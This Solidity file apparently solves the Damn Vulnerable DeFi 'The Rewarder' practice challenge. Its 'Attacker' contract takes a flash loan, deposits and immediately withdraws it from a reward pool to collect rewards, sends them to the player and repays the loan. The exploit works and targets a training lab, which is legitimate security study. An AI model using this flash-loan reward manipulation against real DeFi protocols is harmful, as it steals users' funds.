//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import {FlashLoanerPool} from "./FlashLoanerPool.sol";
import {TheRewarderPool} from "./TheRewarderPool.sol";
import {RewardToken} from "./RewardToken.sol";
import {DamnValuableToken} from "../DamnValuableToken.sol";

contract Attacker {
    uint256 public amount = 1000000 ether;
    FlashLoanerPool public loan;
    TheRewarderPool public pool;
    RewardToken public reward;
    DamnValuableToken public liquidity;
    address public player;

    constructor(
        FlashLoanerPool _loan,
        TheRewarderPool _pool,
        RewardToken _reward,
        DamnValuableToken _liquidity,
        address _player
    ) {
        loan = _loan;
        pool = _pool;
        reward = _reward;
        liquidity = _liquidity;
        player = _player;
    }

    function getLoan() public {
        loan.flashLoan(amount);
    }

    function receiveFlashLoan(uint256 _amount) public {
        require(
            liquidity.balanceOf(address(this)) == _amount,
            "Didn't get loan."
        );
        liquidity.approve(address(pool), _amount);
        pool.deposit(_amount);
        pool.withdraw(_amount);
        uint playerReward = reward.balanceOf(address(this));
        require(playerReward > 0, "Didn't get rewards.");
        reward.transfer(player, playerReward);
        liquidity.transfer(address(loan), _amount);
    }
}
